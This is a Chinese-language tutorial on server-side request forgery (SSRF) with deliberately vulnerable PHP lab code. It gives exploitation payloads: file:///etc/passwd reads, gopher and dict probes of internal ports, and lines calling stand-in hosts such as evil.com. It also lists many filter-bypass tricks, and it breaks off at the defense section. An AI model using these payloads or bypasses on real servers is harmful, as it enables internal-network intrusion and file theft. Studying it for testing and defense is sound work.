# 简介

## 概念

SSRF(Server-Side Request Forgery,服务器请求伪造)，是一种由攻击者利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。

正因为攻击请求是由服务端发起的，所以SSRF能攻击到与它相连而与外网隔离的内部系统。

## 原理

SSRF形成的原因大都是由于**服务端提供了从其他服务器应用获取数据的功能**，且没有对目标地址做过滤与限制。

- 我们经常使用的web应用都提供了从其他的服务器上获取数据的功能。通过使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等。

- 这个功能如果没有对目标地址做过滤与限制（或者限制不到位），造成地址用户可控，那么就会造成类似攻击。

  在PHP中常见的造成ssrf的函数有`file_get_contents()`，`fsockopen()`和`curl_exec()`

- SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

## 攻击场景

攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息。

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3828643291.png)

上面的话说的有点抽象，然后说一下网上大佬的理解

- 首先，我们要对目标网站的架构了解，脑子了要有一个架构图。

- 比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。

  我们普通用户只可以访问a网站，不能访问b网站。

  但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求



# 漏洞查找

所有调外部资源的参数且URL可控的地方都有可能存在ssrf（协议地址端口内容完全可控）

以下容易产生漏洞的业务场景

- 1.指定URL获取图片：加载/下载/上传，如：
  
  ~~~
  http://image.xxx.com/image.php?image=http://127.0.0.1
  ~~~
  
  ​	图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。
  
- 2.预览：预览图片文章等

- 3.文件下载：通过URL进行资源下载

- 4.远程加载资源：discuz的upload from url；web blog的import & expost rss feed；wordpress的xmlrpc.php

- 5.转码服务：通过URL地址把原地址内容进行转码

- 6.在线翻译：通过URL进行网页翻译

- 7.文章图片分享/收藏：从分享的URL中读取其原文的标题等	

  通过URL地址加载或下载图片，如：

  ~~~
  http://share.xxx.com/index.php?url=http://127.0.0.1
  ~~~

  通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。

  图片、文章收藏功能，如：

  ~~~
  http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de
  ~~~

  title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。
  	

- 8.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等

- 9.邮件系统：比如接收邮件服务器地址

- 10.爬虫：某些网站可以对输入的URL进行信息爬取,而且有些爬虫会对爬到的内容进行渲染，在渲染的时候也可能造成ssrf

- 11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……

- 12.数据库内置功能

  ~~~
  mongodb:		db.copyDatabase
  oracle:			UTL_HTTP,UTL_TCP,UTL_SMTP
  postgressql:	dblink_send_query
  MSSQL:			OpenRowset,OpenDatasource
  ~~~

- 13.社交分享功能：获取超链接的标题等内容进行显示

- 14.从远程服务器请求资源（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）

- 15.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作

- 16.云服务商：它会远程执行一些命令来判断网络是否存活等，所以如果可以捕获相应信息，就可以进行SSRF测试


# 漏洞检测

假设一个漏洞场景：某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下：

<pre>http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</pre>

那么网站请求的大概步骤应该是类似以下：

- 用户输入图片地址->请求发送到服务端解析->服务端请求链接地址的图片数据->获取请求的数据加载到前台显示。



这个过程中可能出现问题的点就在于请求发送到服务端的时候，系统没有效验前台给定的参数是不是允许访问的地址域名，例如，如上的链接可以修改为：

~~~
http://www.xxx.com/image.php?image=http://127.0.0.1:22 
~~~

如上请求时则可能返回请求的端口banner。如果协议允许，甚至可以使用其他协议来读取和执行相关命令。例如

~~~
http://www.xxx.com/image.php?image=file:///etc/passwd 
http://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)
http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求)
......
~~~

**判断漏洞是否存在的重要前提是**，链接地址的请求是服务器发起的。

以上链接即使存在并不一定代表这个请求是服务器发起的。因此前提不满足的情况下，SSRF是不必要考虑的。

~~~
http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg 
~~~

若链接获取后，是由js来获取对应参数交由window.location来处理相关的请求，或者加载到当前的iframe框架中，此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求。



# 漏洞验证



例如：某图片地址是

~~~
http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png 

https://xxx.com/image?url=https://thumb.xxx.com/8b/8bx21dbd23c0_w.jpeg&w=1920&q=1 
~~~

> ps：第二个实例图片地址是随便在网上找的，所以打个码。凑巧可能还存在SSRF漏洞，走个流程判断一下。



## **1）基本判断（排除法）**



**排除法一：**

- 我们先验证，请求是否是服务器端发出的。

- 可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是`http://www.baidu.com/img/bd_logo1.png`，说明不存在SSRF漏洞。

- 同理，右键图片，此时浏览器上URL地址栏是`https://xxx.com/image?url=https://thumb.xxx.com/8b/8bx21dbd23c0_w.jpeg&w=1920&q=1`，没有跳转到图片地址，依然是网站的请求地址。嘿！有可能存在SSRF漏洞啊。



![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3029561617.png)

还是有点不明白这里到底存不存在漏洞，SSRF漏洞产生的核心是**请求的链接地址是服务器发起的**

查看包含这个图片页面的源代码，发现图片地址已经写好了，当页面加载图片时客户端会通过GET请求这个地址。

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/1361883056.png)

那对于image这个参数来说是否是属于服务器请求呢

通过第二种排除方法来判断



**排除法二：**

- 可以使用Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含`https://thumb.xxx.com/8b/8bx21dbd23c0_w.jpeg`这个请求。

- 因为SSRF是由服务端发起的请求，因此在加载图片的时候，应该是由服务端发起，而在加载这张图片的时候本地浏览器中不应该存在图片的请求。



如果刷新当前页面，有如下请求(客户端直接请求图片地址了)，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）

比如，图片是百度上的，你调用的是搜狗，浏览器向百度请求图片，那么就不存在 SSRF 漏洞。如果浏览器向搜狗请求图片，那么就说明搜狗服务器发送了请求，向百度请求图片，可能存在 SSRF。

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/2915052197.png)



在实例中，请求数据包中只有`https://xxx.com/image?url=https://thumb.xxx.com/8b/8bx21dbd23c0_w.jpeg&w=1920&q=1`，没有直接请求到图片的地址的数据包，有可能存在SSRF漏洞

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3082732310.png)



懵逼中，如果对SSRF的验证理解没有错，不会这么凑巧让我直接找到一个实战SSRF案例吧，继续验证验证



我直接访问这个图片地址，发现只能抓到这个url的ico，不能直接抓到这个图片地址

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/2420648509.png)

若直接在Repeater中访问这个图片地址，可以直接返回图片

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3140507339.png)

请求这个ICO文件，看能不能请求到

返回结果是“url”参数有效，但上游响应无效，也就是说这个地方

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3348596337.png)

换成百度的图片地址试试，发现禁止使用”url“参数了

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3167216806.png)

结合这两次验证，可以确定对这个图片是通过服务器请求的，可能存在SSRF漏洞，但禁止调用外部地址，应该是做了白名单。





 **为什么使用排除法来判断是否存在SSRF**



举个例子

~~~
http://read.*******.com/image?imageUrl=http://www.baidu.com/img/bd_logo1.png 
~~~

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/774058865.png)



现在大多数修复SSRF的方法基本都是区分内外网来做限制（暂不考虑利用此问题来发起请求，攻击其他网站，从而隐藏攻击者IP，防止此问题就要做请求的地址的白名单了），如果我们请求 ：

~~~
http://read.******.com/image?imageUrl=http://10.10.10.1/favicon.ico 
~~~

而没有内容显示，我们是判断这个点不存在SSRF漏洞，还是`http://10.10.10.1/favicon.ico`这个地址被过滤了，还是`http://10.10.10.1/favicon.ico`这个地址的图片文件不存在，如果我们事先不知道`http://10.10.10.1/favicon.ico`这个地址的文件是否存在的时候是判断不出来是哪个原因的，所以我们采用排除法。



## **2）实例验证**

在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。

在此例子中，首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。

找存在HTTP服务的内网地址：

- 一、从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址
- 二、通过二级域名暴力猜解工具模糊猜测内网地址

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/2888581015.png)
~~~
example:ping xx.xx.com.cn
~~~

可以推测10.215.x.x 此段就有很大的可能： `http://10.215.x.x/favicon.ico` 存在。



在举一个特殊的例子来说明：

~~~
http://fanyi.baidu.com/transpage?query=http://www.baidu.com/s?wd=ip&source=url&ie=utf8&from=auto&to=zh&render=1 
~~~

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/4081606750.png)

此处得到的IP 不是我所在地址使用的IP，因此可以判断此处是由服务器发起的`http://www.baidu.com/s?wd=ip `请求得到的地址

自然是内部逻辑中发起请求的服务器的外网地址（为什么这么说呢，因为发起的请求的不一定是fanyi.baidu.com，而是内部其他服务器）

那么此处是不是SSRF，能形成危害吗？  严格来说此处是SSRF，但是百度已经做过了过滤处理，因此形成不了探测内网的危害。

## 3）其他思路验证

也可以根据不同业务的SSRF产生不同的判断方式

第一种完全回显

> 可以靠着回显的信息来判断是否访问到内网，也可以直接操纵服务器远程下载其他服务器的资源，这种可以完全回显所有信息，危害最大

第二种半回显

> 不会回显被攻击的内网信息，是提示true和false，这种对攻击者提供的信息较少，一般只能探测和盲打，利用率不高。
>
> 但这种依然很有价值，它也许会返回出title或者远程图片

第三种没有回显

> 因为不回显任何信息，只能通过dnslog判断ssrf是否存在，无法用来探测内网，只能配合其他信息泄露来盲打内网。单独存在没有危害。

**SSRF多种思路验证-时间验证**

利用返回的时间去验证它是否存在，访问时间 

`http://192.168.154.134/ssrf/curl_exec.php?url=http://192.168.154.12`

若请求时间很慢，说明这个内网IP存在

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3170090165.png)



**SSRF验证判断-业务根据**

在添加域名的过程中该业务会去自动验证是否能够访问该地址

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/831338152.png)

如果说添加一个内网地址，看到添加失败就会以为对内网做了限制访问。 但是模糊测试后发现它是业务点的功能问题，如果内网地址存在就会添加成功

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3311775448.png)

**SSRF验证判断-业务根据**

这里一个请求外部地址的接口，将外部地址换成内网的地址。

跟上面一样可以利用模糊测试，如果不存在该ip地址会显示失败，如果内网地址存在就能够添加成功

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3905767730.png)





**SSRF验证判断-业务根据**

利用dnslog来验证是否存在远程请求操作，将dnslog地址添加到调用外部地址的地方，如果服务器有请求的这个地址的行为就会向dnslog平台返回数据

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/2921263680.png)

**SSRF验证判断-字节数**

再没有回显的情况下，可以通过返回数据的字节数来判断内网地址存不存在

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3513741141.png)

# 环境搭建

## PHP

下面搬了一份思维导图，总结了一些常见的姿势

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/1964917359.png)

在PHP中会导致ssrf的函数有

~~~
file_get_contents()
fsockopen()
curl_exec()
~~~



### `curl_exec.php`

**函数解析**

- 语法

  ~~~
  mixed curl_exec ( resource $ch )
  ~~~

- php版本：(PHP 4 >= 4.0.2, PHP 5)

- 说明：

  - 执行一个给定curl会话
  - 这个函数应该在初始化一个cURL会话并且全部的选项都被设置后被调用。

- ch

  - 由 curl_init() 返回的 cURL 句柄。

- 返回值

  - 成功时返回 TRUE， 或者在失败时返回 FALSE。 
  - 如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 

**漏洞代码**

~~~
<?php
	if (isset($_GET['url']))
	{
        $link = $_GET['url'];
        // 创建新的 cURL 资源
        $curlobj = curl_init();

        // 设置 URL 和相应的选项
        curl_setopt($curlobj, CURLOPT_POST, 0);
        curl_setopt($curlobj, CURLOPT_URL,$link);
        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);

        // 抓取 URL 并把它传递给浏览器
        $result = curl_exec($curlobj);
        // 关闭 cURL 资源，并且释放系统资源
        curl_close($curlobj);

		$filename = './curled/'.rand().'.txt';
        //将$result的数据写入$filename的文件
        file_put_contents($filename, $result);
        echo "返回获取到的数据：".$result;
	}
?>

~~~

这是在开发中另一个非常常见的操作，它使用`cURL`PHP 获取数据。文件/数据被下载并存储到'curled'文件夹下的磁盘中，并附加一个随机数和'.txt'文件扩展名。(使用时需要先在服务器创建curled目录)

`curl_setopt`

- CURLOPT_POST：为0或者**`true`** 时会发送 POST 请求，类型为：`application/x-www-form-urlencoded`，是 HTML 表单提交时最常见的一种。
- CURLOPT_URL： 需要获取的 URL 地址，也可以在curl_init()初始化会话的时候。
- file_put_contents：将一个字符串写入文件







### ` file_get_contents.php`

函数解析

- 语法

  ~~~
  file_get_contents(path,include_path,context,start,max_length) 
  ~~~

- PHP版本：PHP 4 >= 4.3.0, PHP 5, PHP 7, PHP 8

- 说明

  - 将整个文件读入一个字符串

| 参数         | 描述                                                         |
| :----------- | :----------------------------------------------------------- |
| path         | 必需。规定要读取的文件，或者url。                            |
| include_path | 可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 '1'或者'true'。 |
| context      | 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。 |
| start        | 可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。 |
| max_length   | 可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。          |

**实例1**

获取文件内容

~~~
 <?php
 echo file_get_contents("test.txt");
 ?> 
~~~

上面的代码将输出：

~~~
 This is a test file with test text. 
~~~

**实例2**

获取某个网址页面的源代码也可以使用file_get_contents() 函数

~~~
<?php
 $pagecontent = file_get_contents("http://www.w3cschool.cn");
 echo $pagecontent;
 ?> 
~~~

上面的代码将输出：

~~~
http://www.w3cschool.cn 地址所对应的源代码 
~~~

**漏洞实例**

~~~
<?php

	//isset判断变量是否声明
	if (isset($_POST['url']))
	{
		//获取url
		$content = file_get_contents($_POST['url']);

		//定义图片名称
		$filename = './images/'.rand().'img1.jpg';

		//把一个字符串写入文件
		file_put_contents($filename, $content);

		//返回url
		echo $_POST['url']."";

		//定义图片
		$img = "<img src=\"".$filename."\"/>";
	}

	//展示图片
	echo $img;
?>
~~~

这段代码使用`file_get_contents`PHP函数提取用户请求的数据（在本例中为图像），并将其保存到磁盘上随机生成的文件名的文件中。然后，HTML img属性将图像显示给用户，$content可以由用户控制。



### `fsockopen.php`



~~~
<?php

function GetFile($host,$port,$link)
{

	//打开一个socket连接
	$fp = fsockopen($host, intval($port), $errno, $errstr, 30);
	if (!$fp) {
		echo "$errstr (error number $errno) \n";
	} else {
		$out = "GET $link HTTP/1.1\r\n";
		$out .= "Host: $host\r\n";
		$out .= "Connection: Close\r\n\r\n";
		$out .= "\r\n";

		//把$out写入到$fp
		fwrite($fp, $out);
		$contents='';

		//feof函数测试文件指针是否到了文件结束的位置
		while (!feof($fp)) {
			$contents.= fgets($fp, 1024);
		}
		fclose($fp);
		return $contents;
	}
}
?>
~~~

这段代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。

#  利用方式

**总结**

~~~
1.内外网的端口和服务扫描。可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;
2.攻击运行在内网或本地的应用程序（比如溢出）;
3.对内网web应用进行指纹识别，通过访问默认文件实现，识别企业内部的资产信息等;
4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sql注入等）;
5.利用file、dict、gopher伪协议读取本地文件等。
~~~

对于不同语言实现的web系统可以使用的协议也存在不同的差异，其中：

~~~
php:
http、https、file、gopher、phar、dict、ftp、ssh、telnet、sftp、ldap、tftp...
java:
http、https、file、ftp、jar、netdoc、mailto...
~~~



**完全回显**

根据回显内容和状态即可确定漏洞是否存在。

协议利用

> **HTTP协议**

- 访问百度的robots文件，发现正常获取到数据

- 那么网站请求的大概步骤应该是类似以下：

- 用户输入百度的robots地址->请求发送到服务端解析->服务端请求链接地址的数据->获取请求的数据加载到前台显示。



![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/1589691585.png)

**判断漏洞是否存在的重要前提是**，链接地址的请求是服务器发起的。

在这个案例上，robots的内容获取是服务器通过调用`curl_exec.php`的`curl_exec`函数来完成，因此符合漏洞存在的前提：**请求是由服务器发起**



能不能扫描内网呢，根据返回的数据说明是可以访问到内网的

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/2770315458.png)



> **file函数**

- 绝对路径下使用

- 获取本地文件

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/4266170201.png)

发现白屏，刚开始以为是没回显，最后发现是因为宝塔的缘故。换成之前搭好的ubuntu环境，直接获取到数据



![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/4103354991.png)

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/2133765473.png)



> **dict函数**

- 探测内网端口

扫描21端口，因为端口开着，所以可以看到相关协议的banner信息

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/4020033808.png)

扫描80时返回400

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3437498126.png)

访问一个没有开的端口，没有返回任何数据

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/2360296784.png)



> **gopher协议**

- Gopher协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，不过现在gopher协议用得已经越来越少了
- Gopher协议可以说是SSRF中的万金油，利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。
- **基本协议格式：`URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流`**

在一个bash中开启监听端口，来模仿即将被SSRF攻击到的内网服务，此处采用nc(也可以用tcpdump)。

环境：

~~~
ubuntu+nc(存在漏洞)
centos+nc(内网机器)
~~~

浏览器访问如下链接：`http://192.168.154.134/ssrf/curl_exec.php?url=http://127.0.0.1:2223`。监听端可以看到来自localhost的请求，请求目标为127.0.0.1的2233端口。（也可以直接访问`把127.0.0.1`改成当前漏洞环境IP，最终呈现结果都差不多）

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/327505554.png)

使用gopher协议来查看协议，访问：`http://192.168.154.134/ssrf/curl_exec.php?url=gopher://127.0.0.1:2233/_test`

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3326975854.png)

不过这里遇到一个问题，nc监听每次只能接收到1条数据，不能多次发送

为什么要加`_`，可以尝试发送`gopher://127.0.0.1:2233/test` 然而 test 只回显了 est ，也就是说 t “被吃了”，所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）

向服务器发送`hello:1sss`,使用`gopher://127.0.0.1:2223/_hello%3a1sss`

向服务器发送多行数据，使用`gopher://127.0.0.1:2223/_hello%250a1sss`，这里的`%250a`是`%0a`的编码，在地址栏利用payload时要再进行一次url编码。

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3814695429.png)



上面这个实验是用于利用SSRF攻击本地服务，对于内网其他机器服务的攻击方法也是一样的

那么如何发送HTTP的请求呢？此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：

> 1、构造HTTP数据包
> 2、URL编码、替换回车换行为%0d%0a
> 3、发送gopher协议

如：利用gopher发送POST的请求，URL编码后为：访问：`http://localhost/ssrf.php?url=gopher://192.168.154.128:2233/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword`

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/2893317969.png)

使用场景：

~~~
假设一个内网主机存在Redis未授权访问或者S2漏洞，我们只能访问到公网服务器：
1.公网服务器存在SSRF漏洞，可以构造请求到内网服务器
2.但是构造HTTP数据包比较麻烦，不好通过直接输入实现漏洞利用
3.所以必须用Gopher协议来构造公网服务器对内网服务器的HTTP请求来实现S2漏洞
~~~

因此，Gopher协议的重要性就体现在此处。

**如果SSRF漏洞限制了HTTP协议的话，也可以使用Gopher协议绕过过滤限制**



**半回显**

无回显情况下通过VPS NC监听所有URL Schema存在情况，上面gopher就属于在半回显的情况下使用

1.测试URL Schema

当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL Schema：

~~~
file:///
dict://
gopher://
sftp://
ldap://
tftp://
~~~



> **sftp://**

在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。

~~~
http://example.com/ssrf.php?url=sftp://evil.com:1337
evil.com:$ nc -lvp 1337
Connection from [192.168.0.12] port 1337[tcp/*] 
accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2
~~~

**ldap://或ldaps:// 或ldapi://**

LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。

~~~
http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
~~~

**tftp://**

TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。

~~~
http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
evil.com:# nc -lvup 1337
Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3
~~~

**gopher://**

[Gopher](https://blog.chaitin.cn/gopher-attack-surfaces/)是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。

~~~
http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-<?php  header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?>
 evil.com:# nc -lvp 1337
 Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest
~~~



**无回显**

dnslog无回显解决

**盲打案例**

可结合以下三篇，进行参考。

[ueditor-ssrf漏洞jsp版本](https://www.wtfsec.org/5651/ueditor-ssrf漏洞jsp版本分析与复现)

[Bool型SSRF的思考与实践](https://www.uedbox.com/post/10524/)

[腾讯某处SSRF漏洞](https://blog.csdn.net/Fly_hps/article/details/84396690)

# 漏洞绕过

部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：

**1、攻击本地**

~~~
http://127.0.0.1:80
http://localhost:22
~~~

**2、利用[::]**

~~~
利用[::]绕过localhost
http://[::]:80/  >>>  http://127.0.0.1
~~~

**3、利用@**

~~~
http://example.com@127.0.0.1
~~~

当限制为`http://www.xxx.com` 域名时可以尝试采用http基本身份认证的方式绕过，`http://www.xxx.com@www.xxc.com`
在对@解析域名中，不同的处理函数存在处理差异，例如：

~~~
http://www.aaa.com@www.bbb.com@www.ccc.com
~~~

在PHP的parse_url中会识别`www.ccc.com`，而libcurl则识别为`www.bbb.com`。

**4、利用短地址**

 限制请求IP不为内网地址

~~~
http://dwz.cn/11SMa  >>>  http://127.0.0.1
~~~

**5、利用特殊域名**

如用xip.io来绕过：`http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）`

指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)，利用的原理是DNS解析

~~~
http://127.0.0.1.xip.io/
~~~

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/3888730069.png)

~~~
http://www.owasp.org.127.0.0.1.xip.io/
~~~

**6、利用DNS解析**

在域名上设置A记录，指向127.0.1

~~~
http://ssrf.example.com
~~~

**限制请求只为http协议**

采用302跳转，百度短地址，或者使用`https://tinyurl.com`生成302跳转地址。使用如下：

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/2700627860.png)



**7、利用上传**

~~~
也不一定是上传，我也说不清，自己体会 -.-
修改"type=file"为"type=url"
比如：
上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF
~~~

**8、利用Enclosed alphanumerics**

~~~
利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
~~~

~~~
www.w⓶n⓵ck.com
~~~

**9、利用句号**

~~~
127。0。0。1  >>>  127.0.0.1
~~~

**10、利用进制转换**

~~~
可以是十六进制，八进制等。
115.239.210.26  >>>  16373751032
首先把这四段数字给分别转成16进制，结果：73 ef d2 1a
然后把 73efd21a 这十六进制一起转换成8进制
记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x
~~~

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/4144246936.png)

~~~
http://127.0.0.1  >>>  http://0177.0.0.1/
~~~



![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/29711396.png)



~~~
http://127.0.0.1  >>>  http://2130706433/
http://192.168.0.1  >>>  http://3232235521/
http://192.168.1.1  >>>  http://3232235777/
~~~

**11、利用特殊地址**

~~~
http://0/
~~~

![](https://gitee.com/s1g0day/learn_image_s1g/raw/master/4015406153.png)

**12、利用协议**

~~~
Dict://
dict://<user-auth>@<host>:<port>/d:<word>
ssrf.php?url=dict://attacker:11111/
SFTP://
ssrf.php?url=sftp://example.com:11111/
TFTP://
ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
LDAP://
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
Gopher://
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
~~~

**13、使用组合**

各种绕过进行自由组合即可



# 漏洞防御与修复



1.禁止跳转

